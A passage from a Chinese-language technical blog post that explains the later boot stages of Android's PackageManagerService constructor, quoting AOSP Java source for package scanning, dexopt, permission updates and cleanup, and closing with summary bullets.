&#123;</div><div class="line">                <span class="keyword">continue</span>;</div><div class="line">            &#125;</div><div class="line">            <span class="comment">//跳过后缀不为apk和jar的文件</span></div><div class="line">            <span class="keyword">if</span> (!path.endsWith(<span class="string">".apk"</span>) &amp;&amp; !path.endsWith(<span class="string">".jar"</span>)) &#123;</div><div class="line">                <span class="keyword">continue</span>;</div><div class="line">            &#125;</div><div class="line"></div><div class="line">            <span class="keyword">int</span> dexoptNeeded = DexFile.getDexOptNeeded(path, dexCodeInstructionSet,</div><div class="line">                    <span class="string">"speed"</span>, <span class="keyword">false</span>);</div><div class="line">            <span class="keyword">if</span> (dexoptNeeded != DexFile.NO_DEXOPT_NEEDED) &#123;</div><div class="line">                <span class="comment">//执行dexopt操作【见小节2.2.1】</span></div><div class="line">                mInstaller.dexopt(path, Process.SYSTEM_UID, dexCodeInstructionSet,</div><div class="line">                        dexoptNeeded, DEXOPT_PUBLIC <span class="comment">/*dexFlags*/</span>);</div><div class="line">            &#125;</div><div class="line"></div><div class="line">        &#125;</div><div class="line">    &#125;</div><div class="line">&#125;</div><div class="line"></div><div class="line"><span class="keyword">final</span> VersionInfo ver = mSettings.getInternalVersion();</div><div class="line">mIsUpgrade = !Build.FINGERPRINT.equals(ver.fingerprint);</div><div class="line">mPromoteSystemApps = mIsUpgrade &amp;&amp; ver.sdkVersion &lt;= Build.VERSION_CODES.LOLLIPOP_MR1;</div><div class="line"></div><div class="line"><span class="keyword">if</span> (mPromoteSystemApps) &#123;</div><div class="line">    Iterator&lt;PackageSetting&gt; pkgSettingIter = mSettings.mPackages.values().iterator();</div><div class="line">    <span class="keyword">while</span> (pkgSettingIter.hasNext()) &#123;</div><div class="line">        PackageSetting ps = pkgSettingIter.next();</div><div class="line">        <span class="keyword">if</span> (isSystemApp(ps)) &#123;</div><div class="line">            mExistingSystemPackages.add(ps.name);</div><div class="line">        &#125;</div><div class="line">    &#125;</div><div class="line">&#125;</div><div class="line"></div><div class="line"><span class="comment">//收集供应商包名：/vendor/overlay</span></div><div class="line">File vendorOverlayDir = <span class="keyword">new</span> File(VENDOR_OVERLAY_DIR);</div><div class="line">scanDirLI(vendorOverlayDir, PackageParser.PARSE_IS_SYSTEM</div><div class="line">        | PackageParser.PARSE_IS_SYSTEM_DIR, scanFlags | SCAN_TRUSTED_OVERLAY, <span class="number">0</span>);</div><div class="line"></div><div class="line"><span class="comment">//收集包名：/system/framework</span></div><div class="line">scanDirLI(frameworkDir, PackageParser.PARSE_IS_SYSTEM</div><div class="line">        | PackageParser.PARSE_IS_SYSTEM_DIR</div><div class="line">        | PackageParser.PARSE_IS_PRIVILEGED,</div><div class="line">        scanFlags | SCAN_NO_DEX, <span class="number">0</span>);</div><div class="line"></div><div class="line"><span class="comment">//收集私有的系统包名：/system/priv-app</span></div><div class="line"><span class="keyword">final</span> File privilegedAppDir = <span class="keyword">new</span> File(Environment.getRootDirectory(), <span class="string">"priv-app"</span>);</div><div class="line">scanDirLI(privilegedAppDir, PackageParser.PARSE_IS_SYSTEM</div><div class="line">        | PackageParser.PARSE_IS_SYSTEM_DIR</div><div class="line">        | PackageParser.PARSE_IS_PRIVILEGED, scanFlags, <span class="number">0</span>);</div><div class="line"></div><div class="line"><span class="comment">//收集一般地系统包名：/system/app</span></div><div class="line"><span class="keyword">final</span> File systemAppDir = <span class="keyword">new</span> File(Environment.getRootDirectory(), <span class="string">"app"</span>);</div><div class="line">scanDirLI(systemAppDir, PackageParser.PARSE_IS_SYSTEM</div><div class="line">        | PackageParser.PARSE_IS_SYSTEM_DIR, scanFlags, <span class="number">0</span>);</div><div class="line"></div><div class="line"><span class="comment">//收集私有供应商包名：/vendor/priv-app</span></div><div class="line"><span class="keyword">final</span> File privilegedVendorAppDir = <span class="keyword">new</span> File(Environment.getVendorDirectory(), <span class="string">"priv-app"</span>);</div><div class="line">scanDirLI(privilegedVendorAppDir, PackageParser.PARSE_IS_SYSTEM</div><div class="line">        | PackageParser.PARSE_IS_SYSTEM_DIR</div><div class="line">        | PackageParser.PARSE_IS_PRIVILEGED, scanFlags, <span class="number">0</span>);</div><div class="line"></div><div class="line"><span class="comment">//收集所有的供应商包名：/vendor/app</span></div><div class="line">File vendorAppDir = <span class="keyword">new</span> File(Environment.getVendorDirectory(), <span class="string">"app"</span>);</div><div class="line">vendorAppDir = vendorAppDir.getCanonicalFile();</div><div class="line">scanDirLI(vendorAppDir, PackageParser.PARSE_IS_SYSTEM</div><div class="line">        | PackageParser.PARSE_IS_SYSTEM_DIR, scanFlags, <span class="number">0</span>);</div><div class="line"></div><div class="line"><span class="comment">//收集所有OEM包名：/oem/app</span></div><div class="line"><span class="keyword">final</span> File oemAppDir = <span class="keyword">new</span> File(Environment.getOemDirectory(), <span class="string">"app"</span>);</div><div class="line">scanDirLI(oemAppDir, PackageParser.PARSE_IS_SYSTEM</div><div class="line">        | PackageParser.PARSE_IS_SYSTEM_DIR, scanFlags, <span class="number">0</span>);</div><div class="line"></div><div class="line"><span class="comment">//移除文件</span></div><div class="line">mInstaller.moveFiles();</div><div class="line"></div><div class="line"><span class="comment">//删除不在存在的系统包</span></div><div class="line"><span class="keyword">final</span> List&lt;String&gt; possiblyDeletedUpdatedSystemApps = <span class="keyword">new</span> ArrayList&lt;String&gt;();</div><div class="line"><span class="keyword">if</span> (!mOnlyCore) &#123;</div><div class="line">    Iterator&lt;PackageSetting&gt; psit = mSettings.mPackages.values().iterator();</div><div class="line">    <span class="keyword">while</span> (psit.hasNext()) &#123;</div><div class="line">        PackageSetting ps = psit.next();</div><div class="line"></div><div class="line">        <span class="keyword">if</span> ((ps.pkgFlags &amp; ApplicationInfo.FLAG_SYSTEM) == <span class="number">0</span>) &#123;</div><div class="line">            <span class="keyword">continue</span>;</div><div class="line">        &#125;</div><div class="line"></div><div class="line">        <span class="keyword">final</span> PackageParser.Package scannedPkg = mPackages.get(ps.name);</div><div class="line">        <span class="keyword">if</span> (scannedPkg != <span class="keyword">null</span>) &#123;</div><div class="line">            <span class="keyword">if</span> (mSettings.isDisabledSystemPackageLPr(ps.name)) &#123;</div><div class="line">                removePackageLI(ps, <span class="keyword">true</span>);</div><div class="line">                mExpectingBetter.put(ps.name, ps.codePath);</div><div class="line">            &#125;</div><div class="line">            <span class="keyword">continue</span>;</div><div class="line">        &#125;</div><div class="line"></div><div class="line">        <span class="keyword">if</span> (!mSettings.isDisabledSystemPackageLPr(ps.name)) &#123;</div><div class="line">            psit.remove();</div><div class="line">            removeDataDirsLI(<span class="keyword">null</span>, ps.name);</div><div class="line">        &#125; <span class="keyword">else</span> &#123;</div><div class="line">            <span class="keyword">final</span> PackageSetting disabledPs = mSettings.getDisabledSystemPkgLPr(ps.name);</div><div class="line">            <span class="keyword">if</span> (disabledPs.codePath == <span class="keyword">null</span> || !disabledPs.codePath.exists()) &#123;</div><div class="line">                possiblyDeletedUpdatedSystemApps.add(ps.name);</div><div class="line">            &#125;</div><div class="line">        &#125;</div><div class="line">    &#125;</div><div class="line">&#125;</div><div class="line"></div><div class="line"><span class="comment">//清理所有安装不完整的包</span></div><div class="line">ArrayList&lt;PackageSetting&gt; deletePkgsList = mSettings.getListOfIncompleteInstallPackagesLPr();</div><div class="line"><span class="keyword">for</span>(<span class="keyword">int</span> i = <span class="number">0</span>; i &lt; deletePkgsList.size(); i++) &#123;</div><div class="line">    cleanupInstallFailedPackage(deletePkgsList.get(i));</div><div class="line">&#125;</div><div class="line"><span class="comment">//删除临时文件</span></div><div class="line">deleteTempPackageFiles();</div><div class="line"></div><div class="line"><span class="comment">//移除不相干包中的所有共享userID</span></div><div class="line">mSettings.pruneSharedUsersLPw();</div></pre></td></tr></table></figure>
<p>PMS_SYSTEM_SCAN_START阶段主要做了如下工作：</p>
<ul>
<li>首先将BOOTCLASSPATH，SYSTEMSERVERCLASSPATH这两个环境变量下的路径加入到不需要dex优化集合alreadyDexOpted中<ul>
<li>SYSTEMSERVERCLASSPATH：主要包括/system/framework目录下services.jar，ethernet-service.jar，wifi-service.jar这3个文件。</li>
<li>BOOTCLASSPATH：该环境变量内容较多，不同ROM可能有所不同，常见内容包含/system/framework目录下的framework.jar，ext.jar，core-libart.jar，telephony-common.jar，ims-common.jar，core-junit.jar等文件。</li>
</ul>
</li>
<li>获取共享库mSharedLibraries，判断是否需要dex优化，如果需要则进行dex优化，并加入到alreadyDexOpted列表中</li>
<li>添加framework-res.apk、core-libart.jar两个文件添加到已优化集合alreadyDexOpted中</li>
<li>将framework目录下，其他的apk或者jar，进行dex优化并加入已优化集合alreadyDexOpted中</li>
<li>scanDirLI(): 扫描指定目录下的apk文件，最终调用PackageParser.parseBaseApk来完成AndroidManifest.xml文件的解析，生成Application, activity,service,broadcast, provider等信息</li>
<li>删除系统不存在的包 removePackageLI</li>
<li>清理安装失败的包 cleanupInstallFailedPackage</li>
<li>删除临时文件 deleteTempPackageFiles</li>
<li>移除不相干包中的所有共享userID</li>
</ul>
<h2 id="3-3-PMS-DATA-SCAN-START"><a href="#3-3-PMS-DATA-SCAN-START" class="headerlink" title="3.3 PMS_DATA_SCAN_START"></a>3.3 PMS_DATA_SCAN_START</h2><p>BOOT_PROGRESS_PMS_DATA_SCAN_START阶段：</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div><div class="line">29</div><div class="line">30</div><div class="line">31</div><div class="line">32</div><div class="line">33</div><div class="line">34</div><div class="line">35</div><div class="line">36</div><div class="line">37</div><div class="line">38</div><div class="line">39</div><div class="line">40</div><div class="line">41</div><div class="line">42</div><div class="line">43</div><div class="line">44</div><div class="line">45</div><div class="line">46</div><div class="line">47</div><div class="line">48</div><div class="line">49</div><div class="line">50</div><div class="line">51</div><div class="line">52</div><div class="line">53</div><div class="line">54</div><div class="line">55</div><div class="line">56</div><div class="line">57</div><div class="line">58</div><div class="line">59</div><div class="line">60</div><div class="line">61</div><div class="line">62</div><div class="line">63</div><div class="line">64</div><div class="line">65</div><div class="line">66</div><div class="line">67</div><div class="line">68</div><div class="line">69</div><div class="line">70</div><div class="line">71</div><div class="line">72</div><div class="line">73</div><div class="line">74</div><div class="line">75</div><div class="line">76</div><div class="line">77</div><div class="line">78</div><div class="line">79</div><div class="line">80</div><div class="line">81</div><div class="line">82</div><div class="line">83</div></pre></td><td class="code"><pre><div class="line"><span class="keyword">if</span> (!mOnlyCore) &#123;</div><div class="line">      EventLog.writeEvent(EventLogTags.BOOT_PROGRESS_PMS_DATA_SCAN_START,</div><div class="line">              SystemClock.uptimeMillis());</div><div class="line">      scanDirLI(mAppInstallDir, <span class="number">0</span>, scanFlags | SCAN_REQUIRE_KNOWN, <span class="number">0</span>);</div><div class="line">      scanDirLI(mDrmAppPrivateInstallDir, PackageParser.PARSE_FORWARD_LOCK,</div><div class="line">              scanFlags | SCAN_REQUIRE_KNOWN, <span class="number">0</span>);</div><div class="line">      <span class="comment">/**</span></div><div class="line">       * Remove disable package settings for any updated system</div><div class="line">       * apps that were removed via an OTA. If they're not a</div><div class="line">       * previously-updated app, remove them completely.</div><div class="line">       * Otherwise, just revoke their system-level permissions.</div><div class="line">       */</div><div class="line">      <span class="keyword">for</span> (String deletedAppName : possiblyDeletedUpdatedSystemApps) &#123;</div><div class="line">          PackageParser.Package deletedPkg = mPackages.get(deletedAppName);</div><div class="line">          mSettings.removeDisabledSystemPackageLPw(deletedAppName);</div><div class="line">          String msg;</div><div class="line">          <span class="keyword">if</span> (deletedPkg == <span class="keyword">null</span>) &#123;</div><div class="line">              msg = <span class="string">"Updated system package "</span> + deletedAppName</div><div class="line">                      + <span class="string">" no longer exists; wiping its data"</span>;</div><div class="line">              removeDataDirsLI(<span class="keyword">null</span>, deletedAppName);</div><div class="line">          &#125; <span class="keyword">else</span> &#123;</div><div class="line">              msg = <span class="string">"Updated system app + "</span> + deletedAppName</div><div class="line">                      + <span class="string">" no longer present; removing system privileges for "</span></div><div class="line">                      + deletedAppName;</div><div class="line">              deletedPkg.applicationInfo.flags &amp;= ~ApplicationInfo.FLAG_SYSTEM;</div><div class="line">              PackageSetting deletedPs = mSettings.mPackages.get(deletedAppName);</div><div class="line">              deletedPs.pkgFlags &amp;= ~ApplicationInfo.FLAG_SYSTEM;</div><div class="line">          &#125;</div><div class="line">          logCriticalInfo(Log.WARN, msg);</div><div class="line">      &#125;</div><div class="line">      <span class="comment">/**</span></div><div class="line">       * Make sure all system apps that we expected to appear on</div><div class="line">       * the userdata partition actually showed up. If they never</div><div class="line">       * appeared, crawl back and revive the system version.</div><div class="line">       */</div><div class="line">      <span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">0</span>; i &lt; mExpectingBetter.size(); i++) &#123;</div><div class="line">          <span class="keyword">final</span> String packageName = mExpectingBetter.keyAt(i);</div><div class="line">          <span class="keyword">if</span> (!mPackages.containsKey(packageName)) &#123;</div><div class="line">              <span class="keyword">final</span> File scanFile = mExpectingBetter.valueAt(i);</div><div class="line">              logCriticalInfo(Log.WARN, <span class="string">"Expected better "</span> + packageName</div><div class="line">                      + <span class="string">" but never showed up; reverting to system"</span>);</div><div class="line">              <span class="keyword">final</span> <span class="keyword">int</span> reparseFlags;</div><div class="line">              <span class="keyword">if</span> (FileUtils.contains(privilegedAppDir, scanFile)) &#123;</div><div class="line">                  reparseFlags = PackageParser.PARSE_IS_SYSTEM</div><div class="line">                          | PackageParser.PARSE_IS_SYSTEM_DIR</div><div class="line">                          | PackageParser.PARSE_IS_PRIVILEGED;</div><div class="line">              &#125; <span class="keyword">else</span> <span class="keyword">if</span> (FileUtils.contains(systemAppDir, scanFile)) &#123;</div><div class="line">                  reparseFlags = PackageParser.PARSE_IS_SYSTEM</div><div class="line">                          | PackageParser.PARSE_IS_SYSTEM_DIR;</div><div class="line">              &#125; <span class="keyword">else</span> <span class="keyword">if</span> (FileUtils.contains(vendorAppDir, scanFile)) &#123;</div><div class="line">                  reparseFlags = PackageParser.PARSE_IS_SYSTEM</div><div class="line">                          | PackageParser.PARSE_IS_SYSTEM_DIR;</div><div class="line">              &#125; <span class="keyword">else</span> <span class="keyword">if</span> (FileUtils.contains(oemAppDir, scanFile)) &#123;</div><div class="line">                  reparseFlags = PackageParser.PARSE_IS_SYSTEM</div><div class="line">                          | PackageParser.PARSE_IS_SYSTEM_DIR;</div><div class="line">              &#125; <span class="keyword">else</span> &#123;</div><div class="line">                  Slog.e(TAG, <span class="string">"Ignoring unexpected fallback path "</span> + scanFile);</div><div class="line">                  <span class="keyword">continue</span>;</div><div class="line">              &#125;</div><div class="line">              mSettings.enableSystemPackageLPw(packageName);</div><div class="line">              <span class="keyword">try</span> &#123;</div><div class="line">                  scanPackageLI(scanFile, reparseFlags, scanFlags, <span class="number">0</span>, <span class="keyword">null</span>);</div><div class="line">              &#125; <span class="keyword">catch</span> (PackageManagerException e) &#123;</div><div class="line">                  Slog.e(TAG, <span class="string">"Failed to parse original system package: "</span></div><div class="line">                          + e.getMessage());</div><div class="line">              &#125;</div><div class="line">          &#125;</div><div class="line">      &#125;</div><div class="line">  &#125;</div><div class="line">  mExpectingBetter.clear();</div><div class="line">  <span class="comment">// Now that we know all of the shared libraries, update all clients to have</span></div><div class="line">  <span class="comment">// the correct library paths.</span></div><div class="line">  updateAllSharedLibrariesLPw();</div><div class="line">  <span class="keyword">for</span> (SharedUserSetting setting : mSettings.getAllSharedUsersLPw()) &#123;</div><div class="line">      <span class="comment">// <span class="doctag">NOTE:</span> We ignore potential failures here during a system scan (like</span></div><div class="line">      <span class="comment">// the rest of the commands above) because there's precious little we</span></div><div class="line">      <span class="comment">// can do about it. A settings error is reported, though.</span></div><div class="line">      adjustCpuAbisForSharedUserLPw(setting.packages, <span class="keyword">null</span> <span class="comment">/* scanned package */</span>,</div><div class="line">              <span class="keyword">false</span> <span class="comment">/* force dexopt */</span>, <span class="keyword">false</span> <span class="comment">/* defer dexopt */</span>);</div><div class="line">  &#125;</div><div class="line">  <span class="comment">// Now that we know all the packages we are keeping,</span></div><div class="line">  <span class="comment">// read and update their last usage times.</span></div><div class="line">  mPackageUsage.readLP();</div></pre></td></tr></table></figure>
<ul>
<li>当mOnlyCore = false时，则scanDirLI()还会收集如下目录中的apk<ul>
<li>/data/app</li>
<li>/data/app-private</li>
</ul>
</li>
</ul>
<h2 id="3-4-PMS-SCAN-END"><a href="#3-4-PMS-SCAN-END" class="headerlink" title="3.4 PMS_SCAN_END"></a>3.4 PMS_SCAN_END</h2><p>BOOT_PROGRESS_PMS_SCAN_END阶段：</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div><div class="line">29</div><div class="line">30</div><div class="line">31</div><div class="line">32</div><div class="line">33</div><div class="line">34</div><div class="line">35</div><div class="line">36</div><div class="line">37</div><div class="line">38</div><div class="line">39</div><div class="line">40</div><div class="line">41</div><div class="line">42</div><div class="line">43</div><div class="line">44</div><div class="line">45</div><div class="line">46</div><div class="line">47</div><div class="line">48</div><div class="line">49</div><div class="line">50</div><div class="line">51</div><div class="line">52</div><div class="line">53</div><div class="line">54</div><div class="line">55</div><div class="line">56</div><div class="line">57</div><div class="line">58</div><div class="line">59</div><div class="line">60</div><div class="line">61</div></pre></td><td class="code"><pre><div class="line">EventLog.writeEvent(EventLogTags.BOOT_PROGRESS_PMS_SCAN_END,</div><div class="line">        SystemClock.uptimeMillis());</div><div class="line">Slog.i(TAG, <span class="string">"Time to scan packages: "</span></div><div class="line">        + ((SystemClock.uptimeMillis()-startTime)/<span class="number">1000f</span>)</div><div class="line">        + <span class="string">" seconds"</span>);</div><div class="line"></div><div class="line"><span class="comment">// 当sdk版本不一致时，需要更新权限</span></div><div class="line"><span class="keyword">int</span> updateFlags = UPDATE_PERMISSIONS_ALL;</div><div class="line"><span class="keyword">if</span> (ver.sdkVersion != mSdkVersion) &#123;</div><div class="line">    Slog.i(TAG, <span class="string">"Platform changed from "</span> + ver.sdkVersion + <span class="string">" to "</span></div><div class="line">            + mSdkVersion + <span class="string">"; regranting permissions for internal storage"</span>);</div><div class="line">    updateFlags |= UPDATE_PERMISSIONS_REPLACE_PKG | UPDATE_PERMISSIONS_REPLACE_ALL;</div><div class="line">&#125;</div><div class="line">updatePermissionsLPw(<span class="keyword">null</span>, <span class="keyword">null</span>, StorageManager.UUID_PRIVATE_INTERNAL, updateFlags);</div><div class="line">ver.sdkVersion = mSdkVersion;</div><div class="line"></div><div class="line"><span class="comment">//当这是ota后的首次启动，正常启动则需要清除目录的缓存代码</span></div><div class="line"><span class="keyword">if</span> (!onlyCore &amp;&amp; (mPromoteSystemApps || mFirstBoot)) &#123;</div><div class="line">    <span class="keyword">for</span> (UserInfo user : sUserManager.getUsers(<span class="keyword">true</span>)) &#123;</div><div class="line">        mSettings.applyDefaultPreferredAppsLPw(<span class="keyword">this</span>, user.id);</div><div class="line">        applyFactoryDefaultBrowserLPw(user.id);</div><div class="line">        primeDomainVerificationsLPw(user.id);</div><div class="line">    &#125;</div><div class="line">&#125;</div><div class="line"></div><div class="line"><span class="comment">//当权限和其他默认项都完成更新，则清理相关信息</span></div><div class="line"><span class="keyword">final</span> <span class="keyword">int</span> storageFlags;</div><div class="line"><span class="keyword">if</span> (StorageManager.isFileEncryptedNativeOrEmulated()) &#123;</div><div class="line">    storageFlags = StorageManager.FLAG_STORAGE_DE;</div><div class="line">&#125; <span class="keyword">else</span> &#123;</div><div class="line">    storageFlags = StorageManager.FLAG_STORAGE_DE | StorageManager.FLAG_STORAGE_CE;</div><div class="line">&#125;</div><div class="line">reconcileAppsDataLI(StorageManager.UUID_PRIVATE_INTERNAL, UserHandle.USER_SYSTEM,</div><div class="line">        storageFlags);</div><div class="line"></div><div class="line"><span class="comment">//当这是ota后的首次启动，正常启动则需要清除目录的缓存代码</span></div><div class="line"><span class="keyword">if</span> (mIsUpgrade &amp;&amp; !onlyCore) &#123;</div><div class="line">    Slog.i(TAG, <span class="string">"Build fingerprint changed; clearing code caches"</span>);</div><div class="line">    <span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">0</span>; i &lt; mSettings.mPackages.size(); i++) &#123;</div><div class="line">        <span class="keyword">final</span> PackageSetting ps = mSettings.mPackages.valueAt(i);</div><div class="line">        <span class="keyword">if</span> (Objects.equals(StorageManager.UUID_PRIVATE_INTERNAL, ps.volumeUuid)) &#123;</div><div class="line">            <span class="comment">// No apps are running this early, so no need to freeze</span></div><div class="line">            clearAppDataLIF(ps.pkg, UserHandle.USER_ALL,</div><div class="line">                    StorageManager.FLAG_STORAGE_DE | StorageManager.FLAG_STORAGE_CE</div><div class="line">                            | Installer.FLAG_CLEAR_CODE_CACHE_ONLY);</div><div class="line">        &#125;</div><div class="line">    &#125;</div><div class="line">    ver.fingerprint = Build.FINGERPRINT;</div><div class="line">&#125;</div><div class="line"></div><div class="line">checkDefaultBrowser();</div><div class="line"></div><div class="line"><span class="comment">//当权限和其他默认项都完成更新，则清理相关信息</span></div><div class="line">mExistingSystemPackages.clear();</div><div class="line">mPromoteSystemApps = <span class="keyword">false</span>;</div><div class="line"></div><div class="line"><span class="comment">// All the changes are done during package scanning.</span></div><div class="line">ver.databaseVersion = Settings.CURRENT_DATABASE_VERSION;</div><div class="line"></div><div class="line"><span class="comment">//信息写回packages.xml文件</span></div><div class="line">mSettings.writeLPr();</div></pre></td></tr></table></figure>
<ul>
<li>当sdk版本不一致时，需要更新权限</li>
<li>当这是ota后的首次启动，正常启动则需要清除目录的缓存代码</li>
<li>当权限和其他默认项都完成更新，则清理相关信息</li>
<li>信息写回packages.xml文件</li>
</ul>
<h2 id="3-5-PMS-READY"><a href="#3-5-PMS-READY" class="headerlink" title="3.5 PMS_READY"></a>3.5 PMS_READY</h2><p>BOOT_PROGRESS_PMS_READY阶段：</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div><div class="line">29</div><div class="line">30</div><div class="line">31</div><div class="line">32</div><div class="line">33</div><div class="line">34</div><div class="line">35</div><div class="line">36</div><div class="line">37</div><div class="line">38</div><div class="line">39</div><div class="line">40</div><div class="line">41</div><div class="line">42</div><div class="line">43</div><div class="line">44</div><div class="line">45</div><div class="line">46</div><div class="line">47</div><div class="line">48</div><div class="line">49</div><div class="line">50</div><div class="line">51</div><div class="line">52</div><div class="line">53</div><div class="line">54</div><div class="line">55</div><div class="line">56</div><div class="line">57</div><div class="line">58</div><div class="line">59</div><div class="line">60</div><div class="line">61</div><div class="line">62</div><div class="line">63</div><div class="line">64</div><div class="line">65</div><div class="line">66</div><div class="line">67</div><div class="line">68</div><div class="line">69</div><div class="line">70</div></pre></td><td class="code"><pre><div class="line">    EventLog.writeEvent(EventLogTags.BOOT_PROGRESS_PMS_READY,</div><div class="line">            SystemClock.uptimeMillis());</div><div class="line"></div><div class="line">    <span class="keyword">if</span> (!mOnlyCore) &#123;</div><div class="line">        mRequiredVerifierPackage = getRequiredButNotReallyRequiredVerifierLPr();</div><div class="line">        mRequiredInstallerPackage = getRequiredInstallerLPr();</div><div class="line">        mRequiredUninstallerPackage = getRequiredUninstallerLPr();</div><div class="line">        mIntentFilterVerifierComponent = getIntentFilterVerifierComponentNameLPr();</div><div class="line">        mIntentFilterVerifier = <span class="keyword">new</span> IntentVerifierProxy(mContext,</div><div class="line">                mIntentFilterVerifierComponent);</div><div class="line">        mServicesSystemSharedLibraryPackageName = getRequiredSharedLibraryLPr(</div><div class="line">                PackageManager.SYSTEM_SHARED_LIBRARY_SERVICES);</div><div class="line">        mSharedSystemSharedLibraryPackageName = getRequiredSharedLibraryLPr(</div><div class="line">                PackageManager.SYSTEM_SHARED_LIBRARY_SHARED);</div><div class="line">    &#125; <span class="keyword">else</span> &#123;</div><div class="line">        mRequiredVerifierPackage = <span class="keyword">null</span>;</div><div class="line">        mRequiredInstallerPackage = <span class="keyword">null</span>;</div><div class="line">        mRequiredUninstallerPackage = <span class="keyword">null</span>;</div><div class="line">        mIntentFilterVerifierComponent = <span class="keyword">null</span>;</div><div class="line">        mIntentFilterVerifier = <span class="keyword">null</span>;</div><div class="line">        mServicesSystemSharedLibraryPackageName = <span class="keyword">null</span>;</div><div class="line">        mSharedSystemSharedLibraryPackageName = <span class="keyword">null</span>;</div><div class="line">    &#125;</div><div class="line"></div><div class="line">    mInstallerService = <span class="keyword">new</span> PackageInstallerService(context, <span class="keyword">this</span>);</div><div class="line"></div><div class="line">    <span class="keyword">final</span> ComponentName ephemeralResolverComponent = getEphemeralResolverLPr();</div><div class="line">    <span class="keyword">final</span> ComponentName ephemeralInstallerComponent = getEphemeralInstallerLPr();</div><div class="line">    <span class="comment">// both the installer and resolver must be present to enable ephemeral</span></div><div class="line">    <span class="keyword">if</span> (ephemeralInstallerComponent != <span class="keyword">null</span> &amp;&amp; ephemeralResolverComponent != <span class="keyword">null</span>) &#123;</div><div class="line">        <span class="keyword">if</span> (DEBUG_EPHEMERAL) &#123;</div><div class="line">            Slog.i(TAG, <span class="string">"Ephemeral activated; resolver: "</span> + ephemeralResolverComponent</div><div class="line">                    + <span class="string">" installer:"</span> + ephemeralInstallerComponent);</div><div class="line">        &#125;</div><div class="line">        mEphemeralResolverComponent = ephemeralResolverComponent;</div><div class="line">        mEphemeralInstallerComponent = ephemeralInstallerComponent;</div><div class="line">        setUpEphemeralInstallerActivityLP(mEphemeralInstallerComponent);</div><div class="line">        mEphemeralResolverConnection =</div><div class="line">                <span class="keyword">new</span> EphemeralResolverConnection(mContext, mEphemeralResolverComponent);</div><div class="line">    &#125; <span class="keyword">else</span> &#123;</div><div class="line">        <span class="keyword">if</span> (DEBUG_EPHEMERAL) &#123;</div><div class="line">            <span class="keyword">final</span> String missingComponent =</div><div class="line">                    (ephemeralResolverComponent == <span class="keyword">null</span>)</div><div class="line">                    ? (ephemeralInstallerComponent == <span class="keyword">null</span>)</div><div class="line">                            ? <span class="string">"resolver and installer"</span></div><div class="line">                            : <span class="string">"resolver"</span></div><div class="line">                    : <span class="string">"installer"</span>;</div><div class="line">            Slog.i(TAG, <span class="string">"Ephemeral deactivated; missing "</span> + missingComponent);</div><div class="line">        &#125;</div><div class="line">        mEphemeralResolverComponent = <span class="keyword">null</span>;</div><div class="line">        mEphemeralInstallerComponent = <span class="keyword">null</span>;</div><div class="line">        mEphemeralResolverConnection = <span class="keyword">null</span>;</div><div class="line">    &#125;</div><div class="line"></div><div class="line">    mEphemeralApplicationRegistry = <span class="keyword">new</span> EphemeralApplicationRegistry(<span class="keyword">this</span>);</div><div class="line">&#125; <span class="comment">// synchronized (mPackages)</span></div><div class="line">&#125; <span class="comment">// synchronized (mInstallLock)</span></div><div class="line"></div><div class="line"><span class="comment">// Now after opening every single application zip, make sure they</span></div><div class="line"><span class="comment">// are all flushed.  Not really needed, but keeps things nice and</span></div><div class="line"><span class="comment">// tidy.</span></div><div class="line">Runtime.getRuntime().gc();</div><div class="line"></div><div class="line"><span class="comment">// The initial scanning above does many calls into installd while</span></div><div class="line"><span class="comment">// holding the mPackages lock, but we're mostly interested in yelling</span></div><div class="line"><span class="comment">// once we have a booted system.</span></div><div class="line">mInstaller.setWarnIfHeld(mPackages);</div><div class="line"></div><div class="line"><span class="comment">// Expose private service for system components to use.</span></div><div class="line">LocalServices.addService(PackageManagerInternal.class, <span class="keyword">new</span> PackageManagerInternalImpl());</div></pre></td></tr></table></figure>
<ul>
<li>初始化PackageInstallerService</li>
<li>GC回收下内存</li>
</ul>
<h1 id="四、PMS构造函数-总结"><a href="#四、PMS构造函数-总结" class="headerlink" title="四、PMS构造函数 - 总结"></a>四、PMS构造函数 - 总结</h1><p>PMS初始化过程，分为5个阶段：</p>
<p><strong>1. PMS_START阶段：</strong></p>
<ul>
<li>创建Settings对象；</li>
<li>将6类shareUserId到mSettings；</li>
<li>初始化SystemConfig；</li>
<li>创建名为“PackageManager”的handler线程mHandlerThread;</li>
<li>创建UserManagerService多用户管理服务；</li>
<li>通过解析4大目录中的xmL文件构造共享mSharedLibraries；</li>
</ul>
<p><strong>2. PMS_SYSTEM_SCAN_START阶段：</strong></p>
<ul>
<li>mSharedLibraries共享库中的文件执行dexopt操作；</li>
<li>system/framework目录中满足条件的apk或jar文件执行dexopt操作；</li>
<li>扫描系统apk;</li>
</ul>
<p><strong>3. PMS_DATA_SCAN_START阶段：</strong></p>
<ul>
<li>扫描/data/app目录下的apk;</li>
